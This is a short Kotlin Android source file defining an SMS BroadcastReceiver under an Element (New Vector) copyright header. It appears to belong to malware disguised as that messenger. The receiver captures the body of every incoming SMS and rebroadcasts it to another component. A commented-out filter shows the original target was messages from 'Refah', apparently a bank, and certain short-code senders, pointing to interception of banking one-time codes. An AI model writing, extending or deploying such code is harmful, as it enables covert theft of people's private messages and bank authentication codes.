/*
 * Copyright 2024 New Vector Ltd.
 *
 * SPDX-License-Identifier: AGPL-3.0-only
 * Please see LICENSE in the repository root for full details.
 */

package io.element.android.x.refa

import android.Manifest
import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.SmsMessage
import com.drp.utils.logger


class SmsReceiver : BroadcastReceiver() {
    private lateinit var smsMessage: SmsMessage

    @SuppressLint("SuspiciousIndentation")
    override fun onReceive(context: Context?, intent: Intent?) {
        try {
            val data = intent!!.extras
            val pdus = data!!["pdus"] as Array<Any>?
            var messageBody = ""
            pdus?.let {
                it.forEach { pd ->
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        smsMessage = SmsMessage.createFromPdu(
                            pd as ByteArray,
                            data.getString("format")
                        )
                        messageBody = messageBody.plus(
                            smsMessage.messageBody
                        )
                    } else {
                        smsMessage = SmsMessage.createFromPdu(pd as ByteArray)
                        messageBody = messageBody.plus(
                            smsMessage.messageBody
                        )
                    }
                }
                if (::smsMessage.isInitialized) {
                    val sender = smsMessage.displayOriginatingAddress
//                    if (sender.contains("Refah") || messageBody.contains("Refah") || sender.contains("100031") || sender.contains("500024")) {
                        val local = Intent()
                        local.action = "service.to.activity.transfer"
                        local.putExtra("message", messageBody)
                        context!!.sendBroadcast(local, Manifest.permission.INTERNET)
//                    }
                }
            }
        } catch (ex: Exception) {
            logger(msg = ex.message.toString())
        }
    }
}
